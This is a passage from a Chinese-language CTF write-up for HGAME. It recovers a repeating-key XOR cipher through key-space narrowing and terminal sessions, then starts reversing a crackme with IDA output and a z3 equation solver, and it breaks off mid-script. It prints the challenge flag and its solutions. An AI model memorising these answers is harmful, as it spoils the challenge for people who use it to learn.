9, 7, 6, 28, 15, 78, 1, 78, 15, 0, 78, 27, 10, 11, 3, 29, 26, 0, 1, 78, 7, 11, 78, 28, 100, 27, 49] # first = [31, 18, 90, 21, 25, 15, 31, 31, 14, 31, 112, 21, 112, 22, 8, 90, 14, 31, 90, 14, 18, 90, 9, 90, 87, 21, 31, 3, 27, 15, 14, 19, 22, 27, 28, 27, 46, 25, 31, 27, 90, 30, 31, 22, 25, 24, 21, 19, 20, 31, 14, 93, 31, 90, 31, 90, 31, 30, 14, 9, 12, 27, 14, 31, 18, 41, 57] # first = [69, 84, 94, 67, 84, 69, 17, 92, 17, 17, 94, 95, 104, 88, 17, 70, 89, 90, 70, 17, 84, 67, 31, 69, 70, 67, 95, 17, 17, 69, 17, 84, 72, 66, 17, 69, 89, 80, 69, 17, 85, 88, 17, 88, 90, 84, 90, 95, 85, 17, 89, 93, 66, 80, 69, 59, 67, 17, 89, 88, 88, 67, 89, 17, 86, 2, 0] # first = [65, 93, 85, 19, 19, 29, 71, 64, 80, 71, 71, 82, 92, 73, 81, 92, 86, 19, 91, 82, 65, 86, 19, 91, 90, 19, 71, 93, 93, 19, 71, 64, 19, 19, 67, 92, 86, 94, 91, 94, 90, 93, 94, 93, 19, 82, 19, 19, 19, 64, 86, 95, 19, 65, 65, 88, 82, 90, 19, 87, 87, 19, 86, 90, 82, 85, 67] # first = [49, 104, 104, 44, 45, 104, 32, 45, 41, 39, 32, 36, 61, 45, 58, 58, 104, 66, 45, 104, 45, 41, 28, 41, 58, 66, 104, 39, 41, 60, 32, 104, 59, 66, 39, 58, 58, 45, 45, 41, 38, 47, 45, 47, 39, 58, 41, 60, 33, 60, 104, 104, 39, 45, 33, 38, 36, 60, 59, 45, 33, 37, 104, 59, 37, 29, 0] # first = [119, 35, 93, 37, 54, 3, 50, 59, 57, 119, 50, 119, 119, 119, 54, 60, 36, 56, 57, 39, 119, 36, 63, 35, 50, 62, 54, 35, 58, 63, 50, 32, 46, 32, 35, 36, 50, 119, 37, 35, 57, 119, 57, 123, 49, 36, 35, 63, 58, 37, 93, 36, 49, 119, 52, 56, 119, 112, 62, 119, 57, 56, 36, 119, 50, 102, 100] # first = [57, 56, 49, 49, 51, 56, 112, 38, 112, 51, 34, 36, 61, 57, 57, 57, 51, 37, 112, 49, 49, 63, 53, 112, 52, 36, 62, 112, 53, 53, 57, 53, 61, 53, 53, 112, 54, 57, 112, 53, 53, 50, 37, 112, 112, 113, 112, 53, 49, 49, 61, 53, 112, 32, 49, 39, 35, 35, 52, 63, 55, 34, 49, 36, 43, 123, 34] # first = [87, 92, 25, 78, 81, 80, 86, 92, 88, 86, 25, 92, 88, 77, 87, 87, 92, 77, 64, 80, 75, 87, 25, 78, 25, 23, 90, 81, 25, 64, 75, 75, 84, 75, 87, 86, 86, 87, 51, 21, 75, 92, 25, 51, 78, 51, 64, 25, 94, 80, 80, 92, 64, 75, 85, 87, 64, 25, 92, 95, 25, 92, 84, 81, 97, 13, 68] # first = [65, 65, 17, 8, 65, 18, 3, 18, 13, 13, 2, 2, 24, 77, 65, 6, 15, 65, 14, 15, 4, 18, 107, 4, 21, 65, 4, 0, 7, 65, 65, 4, 4, 4, 21, 19, 19, 65, 2, 65, 65, 8, 14, 9, 14, 53, 14, 12, 8, 6, 5, 65, 14, 4, 79, 65, 12, 107, 18, 65, 13, 65, 4, 4, 81, 15, 107] # first = [57, 61, 57, 54, 55, 120, 50, 116, 43, 55, 55, 48, 120, 120, 82, 120, 61, 43, 45, 44, 120, 120, 62, 127, 55, 23, 43, 46, 55, 51, 82, 120, 44, 120, 49, 120, 61, 48, 48, 59, 55, 54, 62, 45, 52, 57, 45, 49, 54, 48, 60, 58, 45, 44, 120, 57, 53, 47, 120, 44, 49, 55, 118, 120, 42, 60] # first = [5, 27, 30, 16, 3, 20, 18, 87, 24, 5, 26, 25, 25, 21, 30, 21, 4, 14, 87, 30, 4, 17, 30, 5, 87, 2, 3, 18, 5, 25, 24, 21, 5, 3, 22, 7, 91, 22, 24, 22, 5, 16, 87, 25, 1, 28, 5, 5, 18, 3, 27, 24, 5, 3, 35, 4, 18, 31, 18, 31, 25, 5, 125, 17, 40, 83] # first = [38, 55, 60, 114, 58, 61, 49, 88, 114, 33, 34, 59, 61, 39, 33, 55, 114, 63, 62, 60, 55, 61, 32, 55, 62, 32, 61, 114, 114, 55, 37, 51, 59, 58, 62, 32, 114, 60, 61, 38, 114, 114, 51, 53, 55, 55, 114, 32, 114, 114, 55, 38, 114, 43, 58, 114, 38, 55, 59, 59, 55, 114, 1, 62, 59, 52] def test(char): for c in first: num = ord(char) ^ c if (num \u0026lt; 0x20 or 0x7f \u0026lt;= num) and num != 0x0a: # 可能出现换行符 return False return True for c in key: if (test(c)): print (c, end = \u0026#39; \u0026#39;) print() # T # b d e k l o p q r s t u w x y final: p # 7 # F # n # z # b 1 # a c d e f g h i j k m n o p q r s t u v w x y z 0 1 2 3 4 5 7 9 final: 3 # H # W # C D E O P Q R S U V W final: P # k 9 # a # X # w # x R 将密文每十六个分一组，每一组相同位置对应的密钥应该是同一个，因此将这些密文字符组成一个 list，这里命名为 first。\n对每一个位置进行密钥的初筛，最终可以得到代码块下面的注释所示的密钥空间\n随便选择一组密钥进行解密运算\nkey = \u0026#39;Tp7Fnz13HWP9aXwR\u0026#39; a = (bytes([m ^ ord(k) for m, k in zip(cipher, itertools.cycle(key))])) print (a) 对这些密钥进行手动筛查并更新密钥即可，过程如下。\nb\u0026#39;\\nLymmet y zn Art vs whe\u0026lt; t{e Elemznts o4 \\nr pAintvng orrdrrwiNg b~lancereaph Othem \\nout| T{is\\x00cousd be \u0026amp;he3obJectl them!elees\\x0c\\nbjt it 1an3alSo rzlate \u0026amp;o polOrs ~nd \\no\u0026amp;hea cOmpolition3l gecHniqjes.\\nY=u ~ay\\x00not?reali(e zt,\\x00but?your 0razn *is }usy w=rkzng\\x00behvnd th7 spenEs tp seekr\\noft Symmztry w:en3yoU lopk at 3 prinTing1 \\nThe e rre\\x00sevzral r7as|ns\\x00for?this.rThv \\nFirsk is t:at3we\\x07re ward-w;rew tO lopk forr\\nig. our ~ncien\u0026amp; a}ceStorl may \u0026lt;ot3haVe h~d \\na \u0026lt;amv fOr ik, butrthvy Knew?that \u0026amp;hezr *own?bodie! wvre\\x00basvcallyrsy~meTric~l, asr\\nwvre\\x00thole of \u0026#34;otvntIal oredat=rs3or\\x00pref. \\nTh7reuorE, twis ca?e zn Handf whet:er3\\ncHoosvng a ?atv, Catcwing d;nnvr Or \\n~voidi\u0026lt;g qeiNg oq the ?enf oF a lnarli\u0026lt;g,3\\nhUngrf packrof3woLves?or be3rs2\\nTAke ~ lookrat3yoUr f~ce inrthv mIrrom \\nandrimrgiNe a?line !trrigHt dpwn th7 \\n~idDle.?You\\\u0026#39;l\u0026gt; sve Both?sidesrof3yoUr \\nyace a e creTty lymmet icrl.\\x00Thil is \\n9nodn As bvlater3l `ymMetrf and ;t\\\u0026#39;` \\nWherz bothrsiwes\\x00eitwer si6e |f This?\\ndivi6int lIne ~ppearrmoae Or lzss th7 srme\\x0e\\nSo?here ;s ghe\\x00flax: \\nhg3mehX0R_i52a_uS34U184nD$fUQny_C1\u0026#34;H3a}\\n\u0026#39; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;x\u0026#39;) ^ ord(\u0026#39;o\u0026#39;) ^ ord(\u0026#39;g\u0026#39;) 112 \u0026gt;\u0026gt;\u0026gt; chr(112) \u0026#39;p\u0026#39; \u0026gt;\u0026gt;\u0026gt; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py 1069 b\u0026#39;\\nSymmet y zn Art is whe\u0026lt; t{e Elements o4 \\nr pAinting orrdrrwiNg balancereaph Other \\nout| T{is\\x00could be \u0026amp;he3obJects them!elees\\x0c\\nbut it 1an3alSo relate \u0026amp;o polOrs and \\no\u0026amp;hea cOmposition3l gecHniques.\\nY=u ~ay\\x00not reali(e zt,\\x00but your 0razn *is busy w=rkzng\\x00behind th7 spenEs to seekr\\noft Symmetry w:en3yoU look at 3 prinTing. \\nThe e rre\\x00several r7as|ns\\x00for this.rThv \\nFirst is t:at3we\\x07re hard-w;rew tO look forr\\nig. our ancien\u0026amp; a}ceStors may \u0026lt;ot3haVe had \\na \u0026lt;amv fOr it, butrthvy Knew that \u0026amp;hezr *own bodie! wvre\\x00basicallyrsy~meTrical, asr\\nwvre\\x00those of \u0026#34;otvntIal predat=rs3or\\x00prey. \\nTh7reuorE, this ca?e zn Handy whet:er3\\ncHoosing a ?atv, Catching d;nnvr Or \\navoidi\u0026lt;g qeiNg on the ?enf oF a snarli\u0026lt;g,3\\nhUngry packrof3woLves or be3rs2\\nTAke a lookrat3yoUr face inrthv mIrror \\nandrimrgiNe a line !trrigHt down th7 \\n~idDle. You\\\u0026#39;l\u0026gt; sve Both sidesrof3yoUr \\nface a e creTty symmet icrl.\\x00This is \\n9nodn As bilater3l `ymMetry and ;t\\\u0026#39;` \\nWhere bothrsiwes\\x00either si6e |f This \\ndivi6int lIne appearrmoae Or less th7 srme\\x0e\\nSo here ;s ghe\\x00flag: \\nhg3mehX0R_i5-a_uS34U184nD$fUNny_C1\u0026#34;H3a}\\n\u0026#39; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;;\u0026#39;) ^ ord(\u0026#39;a\u0026#39;) ^ ord(\u0026#39;i\u0026#39;) 51 \u0026gt;\u0026gt;\u0026gt; chr(51) \u0026#39;3\u0026#39; \u0026gt;\u0026gt;\u0026gt; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py 1069 b\u0026#34;\\nSymmetry zn Art is when t{e Elements of \\nr pAinting or drrwiNg balance eaph Other \\nout. T{is\\x00could be the3obJects themselees\\x0c\\nbut it can3alSo relate to polOrs and \\nothea cOmpositional gecHniques.\\nYou ~ay\\x00not realize zt,\\x00but your brazn *is busy workzng\\x00behind the spenEs to seek \\noft Symmetry when3yoU look at a prinTing. \\nThere rre\\x00several reas|ns\\x00for this. Thv \\nFirst is that3we\\x07re hard-wirew tO look for \\nig. our ancient a}ceStors may not3haVe had \\na namv fOr it, but thvy Knew that thezr *own bodies wvre\\x00basically sy~meTrical, as \\nwvre\\x00those of potvntIal predators3or\\x00prey. \\nThereuorE, this came zn Handy whether3\\ncHoosing a matv, Catching dinnvr Or \\navoiding qeiNg on the menf oF a snarling,3\\nhUngry pack of3woLves or bears2\\nTAke a look at3yoUr face in thv mIrror \\nand imrgiNe a line strrigHt down the \\n~idDle. You\u0026#39;ll sve Both sides of3yoUr \\nface are creTty symmetricrl.\\x00This is \\nknodn As bilateral `ymMetry and it\u0026#39;` \\nWhere both siwes\\x00either side |f This \\ndividint lIne appear moae Or less the srme\\x0e\\nSo here is ghe\\x00flag: \\nhgamehX0R_i5-a_uS3fU184nD$fUNny_C1pH3a}\\n\u0026#34; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;x\u0026#39;) ^ ord(\u0026#39; \u0026#39;) 88 \u0026gt;\u0026gt;\u0026gt; chr(88) \u0026#39;X\u0026#39; \u0026gt;\u0026gt;\u0026gt; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py 1069 b\u0026#34;\\nSymmetry zn art is when t{e elements of \\nr painting or drrwing balance eaph other \\nout. T{is could be the3objects themselees, \\nbut it can3also relate to polors and \\nothea compositional gechniques.\\nYou ~ay not realize zt, but your brazn \\nis busy workzng behind the spenes to seek \\noft symmetry when3you look at a printing. \\nThere rre several reas|ns for this. Thv \\nfirst is that3we\u0026#39;re hard-wirew to look for \\nig. Our ancient a}cestors may not3have had \\na namv for it, but thvy knew that thezr \\nown bodies wvre basically sy~metrical, as \\nwvre those of potvntial predators3or prey. \\nThereuore, this came zn handy whether3\\nchoosing a matv, catching dinnvr or \\navoiding qeing on the menf of a snarling,3\\nhungry pack of3wolves or bears2\\nTake a look at3your face in thv mirror \\nand imrgine a line strright down the \\n~iddle. You\u0026#39;ll sve both sides of3your \\nface are cretty symmetricrl. This is \\nknodn as bilateral `ymmetry and it\u0026#39;` \\nwhere both siwes either side |f this \\ndividint line appear moae or less the srme.\\nSo here is ghe flag: \\nhgamehX0r_i5-a_uS3fU184nd$fUNny_C1pH3a}\\n\u0026#34; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 Python 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; ord(\u0026#39;g\u0026#39;) ^ ord(\u0026#39;C\u0026#39;) ^ ord(\u0026#39;t\u0026#39;) 80 \u0026gt;\u0026gt;\u0026gt; chr(80) \u0026#39;P\u0026#39; \u0026gt;\u0026gt;\u0026gt; ubuntu@DESKTOP:/mnt/d/HGAME/cipher$ python3 solve.py 1069 b\u0026#34;\\nSymmetry in art is when the elements of \\na painting or drawing balance each other \\nout. This could be the objects themselves, \\nbut it can also relate to colors and \\nother compositional techniques.\\nYou may not realize it, but your brain \\nis busy working behind the scenes to seek \\nout symmetry when you look at a painting. \\nThere are several reasons for this. The \\nfirst is that we\u0026#39;re hard-wired to look for \\nit. Our ancient ancestors may not have had \\na name for it, but they knew that their \\nown bodies were basically symmetrical, as \\nwere those of potential predators or prey. \\nTherefore, this came in handy whether \\nchoosing a mate, catching dinner or \\navoiding being on the menu of a snarling, \\nhungry pack of wolves or bears!\\nTake a look at your face in the mirror \\nand imagine a line straight down the \\nmiddle. You\u0026#39;ll see both sides of your \\nface are pretty symmetrical. This is \\nknown as bilateral symmetry and it\u0026#39;s \\nwhere both sides either side of this \\ndividing line appear more or less the same.\\nSo here is the flag: \\nhgame{X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r}\\n\u0026#34; FAKE 第一次做 SMC\nstep 0：错误的做法 拖入ida\n进入主函数\n__int64 __usercall main@\u0026lt;rax\u0026gt;(char **a1@\u0026lt;rsi\u0026gt;, char **a2@\u0026lt;rdx\u0026gt;, __int64 a3@\u0026lt;rbp\u0026gt;) { __int64 v3; // rdx  __int64 v4; // rdx  __int64 v6; // [rsp-D8h] [rbp-D8h]  __int64 flag; // [rsp-48h] [rbp-48h]  signed int i; // [rsp-Ch] [rbp-Ch]  __int64 v9; // [rsp-8h] [rbp-8h]  __asm { endbr64 } v9 = a3; print(\u0026#34;Give me your true flag:\u0026#34;, a1, a2); scan(\u0026#34;%50s\u0026#34;, \u0026amp;flag); if ( length(\u0026amp;flag) != 36 ) { print(\u0026#34;Wrong length.\u0026#34;, \u0026amp;flag, v3); sub_401120(); } for ( i = 0; i \u0026lt;= 35; ++i ) *((_DWORD *)\u0026amp;v9 + i - 52) = *((char *)\u0026amp;v9 + i - 64);// v9 - 64 = flag, flag往前偏移12个字节  if ( (unsigned int)sub_401216((__int64)\u0026amp;v6) == 1 )// 动态调试结果显示，v6就是输入的flag  print(\u0026#34;Ohhhhhhhhhh!\u0026#34;, \u0026amp;flag, v4); else print(\u0026#34;Wrong flag. Keep looking!\u0026#34;, \u0026amp;flag, v4); return 0LL; } 发现对于输入的flag，进行一个函数的判断\n进入函数，发现一串如下的代码\nv2 = -37 * *(_DWORD *)(*(v1 - 3) + 4) + -58 * *(_DWORD *)(*(v1 - 3) + 132) + 17 * *(_DWORD *)(*(v1 - 3) + 28) + 26 * *(_DWORD *)(*(v1 - 3) + 124) + -20 * *(_DWORD *)(*(v1 - 3) + 48) + -56 * *(_DWORD *)(*(v1 - 3) + 104) + 70 * *(_DWORD *)(*(v1 - 3) + 76) + 29 * *(_DWORD *)*(v1 - 3) + -42 * *(_DWORD *)(*(v1 - 3) + 68) + 67 * *(_DWORD *)(*(v1 - 3) + 140) + 11 * *(_DWORD *)(*(v1 - 3) + 24) + 66 * *(_DWORD *)(*(v1 - 3) + 60) + 53 * *(_DWORD *)(*(v1 - 3) + 44) - 53 * *(_DWORD *)(*(v1 - 3) + 12) + 63 * *(_DWORD *)(*(v1 - 3) + 128) - 65 * *(_DWORD *)(*(v1 - 3) + 84) + 9 * *(_DWORD *)(*(v1 - 3) + 36) - 50 * *(_DWORD *)(*(v1 - 3) + 112) - 48 * *(_DWORD *)(*(v1 - 3) + 32) - 70 * *(_DWORD *)(*(v1 - 3) + 88) + 48 * *(_DWORD *)(*(v1 - 3) + 52); if ( -35 * *(_DWORD *)(*(v1 - 3) + 8) + 89 * *(_DWORD *)(*(v1 - 3) + 96) + -49 * *(_DWORD *)(*(v1 - 3) + 64) + -19 * *(_DWORD *)(*(v1 - 3) + 16) + 88 * *(_DWORD *)(*(v1 - 3) + 100) + -7 * *(_DWORD *)(*(v1 - 3) + 120) + *(_DWORD *)(*(v1 - 3) + 108) + -33 * *(_DWORD *)(*(v1 - 3) + 80) + -23 * *(_DWORD *)(*(v1 - 3) + 92) + 90 * *(_DWORD *)(*(v1 - 3) + 56) + -99 * *(_DWORD *)(*(v1 - 3) + 40) + 30 * *(_DWORD *)(*(v1 - 3) + 116) + v2 - 68 * *(_DWORD *)(*(v1 - 3) + 136) - 14 * *(_DWORD *)(*(v1 - 3) + 20) - 67 * *(_DWORD *)(*(v1 - 3) + 72) != -874 ) goto LABEL_42; 用gdb调试看了一下，发现 *(v1 - 3) + 4 * i 就对应 input[i]\n总共有36个方程，使用z3求解\nfrom z3 import * s = Solver() f = [ Int(\u0026#39;f%d\u0026#39; % i) for i in range(36) ] for i in range(36): s.add(f[i] \u0026gt; 0x20) s.add(f[i] \u0026lt; 0x7f) s.add(f[ 0] == ord(\u0026#39;h\u0026#39;)) s.add(f[ 1] == ord(\u0026#39;g\u0026#39;)) s.add(f[ 2] == ord(\u0026#39;a\u0026#39;)) s.add(f[ 3] == ord(\u0026#39;m\u0026#39;)) s.add(f[ 4] == ord(\u0026#39;e\u0026#39;)) s.add(f[ 5] == ord(\u0026#39;{\u0026#39;)) s.add(f[35] == ord(\u0026#39;}\u0026#39;)) s.add(-37 * f[1] + -58 * f[33] + 17 * f[7] + 26 * f[31] + -20 * f[12] + -56 * f[26] + 70 * f[19] + 29 * f[0] + -42 * f[17] + 67 * f[35] + 11 * f[6] + 66 * f[15] + 53 * f[11] - 53 * f[3] + 63 * f[32] - 65 * f[21] + 9 * f[9] - 50 * f[28] - 48 * f[8] - 70 * f[22] + 48 * f[13] -35 * f[2] + 89 * f[24] + -49 * f[16] + -19 * f[4] + 88 * f[25] + -7 * f[30] + f[27] + -33 * f[20] + -23 * f[23] + 90 * f[14] + -99 * f[10] + 30 * f[29] - 68 * f[34] - 14 * f[5] - 67 * f[18] == -874) s.add(64 * f[18] + -57 * f[15] + 90 * f[21] + 57 * f[4] + -63 * f[13] + 13 * f[2] + 10 * f[35] + -56 * f[8] + 56 * f[31] + -40 * f[0] + -91 * f[27] + 57 * f[23] + 62 * f[10] + 90 * f[9] + -92 * f[17] + -5 * f[29] + 60 * f[22] - 13 * f[12] + 5 * f[28] - 63 * f[32] + 5 * f[26] -41 * f[25] + -47 * f[16] + f[14] + 67 * f[34] + -20 * f[1] + 47 * f[33] + -79 * f[19] + -17 * f[6] + 30 * f[5] + 70 * f[3] + 41 * f[7] + 71 * f[24] + 15 * f[11] + 42 * f[20] == 21163) s.add(28 * f[13] + 77 * f[19] + 2 * f[7] + -53 * f[10] + -61 * f[4] + 12 * f[17] + 93 * f[11] + -13 * f[32] + 53 * f[9] + 29 * f[16] + -77 * f[14] + 77 * f[33] + 74 * f[34] + -100 * f[30] - 99 * f[27] - 87 * f[25] + 36 * f[6] + 59 * f[3] + 81 * f[21] + 28 * f[28] + 7 * f[0] + 73 * f[26] + 50 * f[20] + 88 * f[35] + 49 * f[1] + 34 * f[23] + 58 * f[29] + 69 * f[24] + 54 * f[22] - 5 * f[31] - 41 * f[2] + 5 * f[18] - 93 * f[15] + 10 * f[12] - 27 * f[8] + 24 * f[5] == 45615) s.add(-46 * f[20] + -61 * f[6] + -46 * f[19] + 51 * f[4] + -76 * f[34] + -17 * f[31] + 8 * f[28] + 94 * f[30] + 23 * f[8] + -61 * f[29] + -52 * f[35] + 81 * f[33] + -44 * f[1] + 75 * f[32] + -9 * f[24] - 96 * f[12] + 5 * f[26] + 2 * f[25] + 31 * f[22] + 43 * f[15] - 2 * f[0] - 17 * f[23] + 53 * f[21] + 51 * f[13] + 58 * f[17] + -52 * f[10] + -77 * f[7] + 86 * f[11] + -77 * f[16] + -100 * f[18] + -61 * f[2] - 92 * f[14] + 13 * f[5] - 99 * f[3] + 63 * f[27] + 8 * f[9] == -37017) s.add(9 * f[16] + 59 * f[3] + -29 * f[14] + 32 * f[18] + -69 * f[26] + -81 * f[33] + -69 * f[9] + 60 * f[19] + -35 * f[21] + 40 * f[11] + -44 * f[7] + 78 * f[22] + 68 * f[28] + 70 * f[29] + 3 * f[2] + 61 * f[6] + 37 * f[35] - 36 * f[27] + 40 * f[34] + 23 * f[17] + 81 * f[12] - 25 * f[4] + 91 * f[0] + -43 * f[32] + 17 * f[13] + 9 * f[15] + f[1] * 64 + 69 * f[30] - 9 * f[23] - 75 * f[25] - 62 * f[20] + 56 * f[31] + 96 * f[5] + 69 * f[8] + 80 * f[10] + 99 * f[24] == 72092) s.add(-79 * f[26] + -20 * f[8] + 90 * f[6] + 6 * f[30] + 47 * f[16] + 50 * f[20] + 51 * f[23] + -13 * f[33] + -86 * f[13] + 32 * f[31] + -89 * f[2] + 79 * f[11] + -41 * f[7] + -56 * f[14] + 54 * f[19] - 96 * f[34] - 34 * f[25] - 64 * f[4] - 36 * f[35] + 48 * f[10] - 39 * f[5] + 51 * f[32] + -63 * f[21] + 78 * f[24] + -76 * f[28] + 48 * f[18] + 93 * f[1] + 66 * f[29] + -86 * f[27] + -3 * f[0] + 20 * f[3] + 61 * f[17] - 56 * f[15] - 97 * f[22] + 96 * f[9] - 61 * f[12] == -27809) s.add(-74 * f[28] + 76 * f[33] + 91 * f[5] + 83 * f[19] + 99 * f[32] + 98 * f[7] + 22 * f[34] + 83 * f[13] + -13 * f[0] + -66 * f[11] + -25 * f[2] + -9 * f[31] + 35 * f[25] + 31 * f[18] - 95 * f[21] + 37 * f[22] - 74 * f[16] + 17 * f[12] - 27 * f[24] + 11 * f[3] + 83 * f[9] + -44 * f[35] + -26 * f[30] + -36 * f[4] + 64 * f[6] + -65 * f[26] + -46 * f[8] + -33 * f[14] + -45 * f[1] + -32 * f[23] - 60 * f[27] + 77 * f[20] + 96 * f[15] - 23 * f[10] - 5 * f[29] - 73 * f[17] == 9604) s.add(-57 * f[31] + 32 * f[25] + 55 * f[16] + 42 * f[24] + -93 * f[26] + 69 * f[17] + 84 * f[12] + 9 * f[23] + -34 * f[32] + -84 * f[2] + -18 * f[7] + 60 * f[29] - 99 * f[30] - f[0] + 24 * f[21] - 36 * f[4] + 9 * f[35] + 89 * f[15] + 72 * f[19] + 86 * f[13] - 8 * f[28] + -79 * f[10] + 82 * f[8] + -88 * f[3] + -26 * f[11] + 76 * f[1] + 69 * f[27] + -51 * f[14] + 78 * f[33] + -11 * f[18] + -83 * f[5] + 70 * f[20] + -36 * f[22] + 64 * f[6] + 19 * f[9] + 71 * f[34] == 25498) s.add(-80 * f[15] + -54 * f[2] + 75 * f[6] + -31 * f[17] + 29 * f[12] + 28 * f[28] + 57 * f[14] + -68 * f[4] + 86 * f[0] + 82 * f[13] + -20 * f[11] + -18 * f[23] + 88 * f[18] + -57 * f[25] + 94 * f[9] - 51 * f[5] - 58 * f[7] - 2 * f[3] + 94 * f[31] - 6 * f[21] - 59 * f[19] + -70 * f[8] + 50 * f[30] + 26 * f[16] + 65 * f[32] + -62 * f[34] + 79 * f[10] + -82 * f[27] + -16 * f[29] + -60 * f[1] + 25 * f[20] - 66 * f[35] - 62 * f[24] + 89 * f[26] + 12 * f[22] - 86 * f[33] == -10472) s.add(-91 * f[20] + -11 * f[17] + 38 * f[3] + 53 * f[35] + 31 * f[5] + -75 * f[22] + 14 * f[26] + -7 * f[24] + -7 * f[31] + 77 * f[23] + -46 * f[6] + 47 * f[19] + 48 * f[33] + 74 * f[ 1] - 24 * f[30] + 87 * f[9] + 33 * f[11] + 86 * f[28] + 37 * f[21] - 97 * f[27] - 30 * f[13] + 31 * f[14] + -11 * f[2] + 30 * f[10] + 72 * f[8] + 72 * f[29] + -49 * f[34] + 83 * f[18] + -63 * f[0] + -88 * f[4] - 59 * f[16] + 5 * f[7] - 3 * f[15] + 13 * f[12] - 73 * f[32] - 56 * f[25] == 6560) s.add(-74 * f[20] + -97 * f[6] + 14 * f[15] + 77 * f[30] + -66 * f[28] + -89 * f[12] + -95 * f[13] + -70 * f[10] + -27 * f[1] + -85 * f[22] + -66 * f[34] + -91 * f[4] - 5 * f[19] - 94 * f[29] - 24 * f[35] - 7 * f[32] + 63 * f[5] - 49 * f[14] - 96 * f[18] - 100 * f[7] + 81 * f[16] + 59 * f[23] + -81 * f[8] + 49 * f[0] + -52 * f[3] + 84 * f[2] + 26 * f[25] + 70 * f[11] + 3 * f[21] + 28 * f[24] - 14 * f[9] + 59 * f[17] + 24 * f[31] - 25 * f[27] + 20 * f[33] - 77 * f[26] == -69431) s.add(-69 * f[25] + 33 * f[20] + 55 * f[24] + 69 * f[18] + 83 * f[15] + -19 * f[13] + 22 * f[21] + f[16] + -53 * f[22] + -58 * f[4] + -63 * f[29] - 91 * f[26] + 28 * f[34] + 5 * f[3] + 35 * f[8] + 27 * f[ 1] - 31 * f[27] + 10 * f[12] + 84 * f[33] + 24 * f[14] + 42 * f[11] + 98 * f[28] + 2 * f[7] + 70 * f[19] + 53 * f[35] + 34 * f[6] + 30 * f[5] + 55 * f[23] + 69 * f[10] + 60 * f[2] - 2 * f[17] + 68 * f[32] + 21 * f[0] - f[9] + 60 * f[31] - 60 * f[30] == 54106) s.add(15 * f[31] + -96 * f[21] + 38 * f[19] + -81 * f[9] + -68 * f[12] + 89 * f[20] + 33 * f[2] + 70 * f[34] + 79 * f[28] + -80 * f[35] + 76 * f[10] - 38 * f[5] + 5 * f[6] + 60 * f[11] - 8 * f[26] - 59 * f[23] + 9 * f[24] + 34 * f[17] - 60 * f[1] + 98 * f[25] + 48 * f[16] + -88 * f[22] + -96 * f[3] + f[18] * 64 + -61 * f[15] + -92 * f[13] + 50 * f[8] + 90 * f[29] + 32 * f[4] + -97 * f[27] + 14 * f[14] + f[30] + 97 * f[7] - 17 * f[32] - 96 * f[0] + 54 * f[33] == -8292) s.add(-7 * f[3] + 49 * f[17] + 60 * f[25] + -45 * f[16] + -50 * f[0] + -98 * f[28] + -92 * f[12] + -22 * f[23] + 33 * f[13] + 57 * f[31] - 15 * f[5] + 36 * f[29] - 88 * f[15] + 12 * f[21] + 71 * f[14] - 48 * f[35] + 79 * f[34] - 5 * f[19] + 68 * f[33] - 2 * f[4] - 82 * f[10] + -58 * f[32] + 53 * f[8] + -57 * f[30] + -29 * f[24] + -28 * f[26] - 16 * f[18] - 98 * f[22] - f[27] * 64 + 32 * f[11] + 73 * f[2] - 38 * f[20] + 27 * f[9] - 7 * f[7] - 30 * f[ 1] - 35 * f[6] == -44677) s.add(4 * f[31] + -43 * f[18] + -36 * f[29] + 60 * f[14] + 29 * f[20] + -85 * f[19] + 71 * f[27] + -22 * f[11] + 95 * f[9] + 19 * f[12] + -20 * f[30] + 6 * f[34] + 49 * f[6] + 13 * f[10] - 23 * f[13] + 17 * f[7] - 79 * f[22] + 12 * f[3] - 7 * f[4] - 12 * f[2] - 78 * f[17] + -86 * f[28] + -69 * f[33] + -31 * f[21] + 91 * f[15] + 91 * f[8] + 58 * f[16] + -91 * f[23] - 56 * f[5] + 59 * f[26] + 18 * f[32] - 87 * f[35] - 30 * f[24] + 54 * f[25] - 5 * f[ 1] - 94 * f[0] == -17772) s.add(-17 * f[9] + -93 * f[12] + -85 * f[20] + -73 * f[35] + -87 * f[24] + -80 * f[25] + -87 * f[4] + 56 * f[27] + -89 * f[21] + 52 * f[15] + 97 * f[0] + -11 * f[19] + -94 * f[10] + -92 * f[29] + -20 * f[17] - 95 * f[5] - 13 * f[8] + 80 * f[31] - f[33] + 37 * f[30] + 64 * f[32] + -18 * f[18] + -76 * f[34] + 65 * f[3] + -78 * f[13] + -71 * f[26] + -44 * f[23] + 61 * f[7] + 63 * f[1] + 9 * f[16] + 11 * f[22] - 39 * f[14] + 80 * f[6] - 33 * f[11] - 62 * f[2] - 74 * f[28] == -77151) s.add(54 * f[20] + 65 * f[22] + -9 * f[9] + -61 * f[24] + -45 * f[25] + 47 * f[4] + 31 * f[5] + 36 * f[23] + 20 * f[13] - 40 * f[2] - 64 * f[12] - 40 * f[14] + 81 * f[10] - 35 * f[0] - 12 * f[27] + 35 * f[30] + 63 * f[15] - 65 * f[19] + 31 * f[18] - 42 * f[35] + 33 * f[11] + 